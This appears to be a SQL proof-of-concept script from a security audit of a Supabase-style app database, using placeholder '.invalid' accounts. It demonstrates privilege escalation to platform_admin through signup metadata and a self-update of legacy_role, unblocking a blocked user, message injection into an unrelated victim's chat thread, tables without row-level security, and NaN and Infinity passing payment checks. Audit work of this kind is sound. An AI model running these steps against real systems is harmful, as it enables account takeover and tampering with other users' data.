\set ON_ERROR_STOP off
INSERT INTO auth.users(id,email,raw_user_meta_data) VALUES ('11111111-1111-1111-1111-111111111111','customer@audit.invalid','{"legacy_role":"service_seeker"}'), ('22222222-2222-2222-2222-222222222222','victim@audit.invalid','{"legacy_role":"service_seeker"}'), ('33333333-3333-3333-3333-333333333333','attacker@audit.invalid','{"legacy_role":"platform_admin"}');
SELECT 'signup_metadata_admin' AS proof,email,role,legacy_role FROM public.users WHERE email='attacker@audit.invalid';
INSERT INTO public.chat_threads(client_user_id,transporter_user_id) SELECT victim.id, admin.id FROM public.users victim CROSS JOIN public.users admin WHERE victim.email='victim@audit.invalid' AND admin.email='attacker@audit.invalid';
SELECT set_config('request.jwt.claim.sub','11111111-1111-1111-1111-111111111111',false);
SET ROLE authenticated;
SELECT 'before_legacy_escalation' AS proof,role,legacy_role,is_blocked FROM public.users WHERE auth_id=auth.uid();
UPDATE public.users SET legacy_role='platform_admin',is_blocked=false WHERE auth_id=auth.uid();
SELECT 'after_legacy_escalation' AS proof,role,legacy_role,is_blocked FROM public.users WHERE auth_id=auth.uid();
SELECT 'unrelated_thread_visible_before_injection' AS proof,COUNT(*) FROM public.chat_threads;
INSERT INTO public.chat_messages(thread_id,sender_user_id,content) VALUES (1, public.current_app_user_id(),'injected into unrelated victim thread');
SELECT 'agreement_policy_recursion' AS proof,COUNT(*) FROM public.agreements;
SELECT 'agreement_truck_policy_recursion' AS proof,COUNT(*) FROM public.agreement_trucks;
RESET ROLE;
SELECT 'unrelated_thread_message_persisted' AS proof,thread_id,sender_user_id,content FROM public.chat_messages;
SELECT 'missing_hire_table' AS proof,to_regclass('public.driver_hire_contracts');
SELECT 'tables_with_rls_disabled' AS proof, c.relname FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE n.nspname='public' AND c.relkind='r' AND NOT c.relrowsecurity ORDER BY c.relname;
SELECT 'NaN_passes_new_money_check' AS proof, 'NaN'::numeric >= 0 AS nan_ge_zero;
SELECT 'unbounded_numeric_infinity_not_rejected_by_payment_check' AS proof,'Infinity'::numeric >= 0 AND 'Infinity'::numeric <> 'NaN'::numeric AS infinite_valid;
